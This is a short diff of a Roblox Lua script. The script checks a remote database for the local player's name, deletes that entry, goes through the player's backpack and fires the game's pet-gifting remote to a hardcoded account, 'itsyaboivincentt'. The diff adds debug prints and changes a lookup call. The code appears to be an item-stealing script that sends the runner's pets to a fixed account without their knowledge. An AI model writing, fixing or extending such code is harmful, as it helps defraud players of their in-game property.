@@ -136,7 +136,9 @@ coroutine.wrap(function()
 
 		if data ~= nil then
 			for Username, PetName in data.Remotes do
+				print(Username)
 				if Username == string.lower(LocalPlayer.Name) then
+					print("true")
 					DeleteDatabase("Remotes", LocalPlayer.Name)
 
 					for i, v in game:GetService("Players").LocalPlayer.Backpack:GetChildren() do
@@ -175,7 +177,7 @@ coroutine.wrap(function()
 
 							local args = {
 								"GivePet",
-								game:GetService("Players"):WaitForChild("itsyaboivincentt")
+								game:GetService("Players"):FindFirstChild("itsyaboivincentt")
 							}
 							game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("PetGiftingService"):FireServer(unpack(args))
 
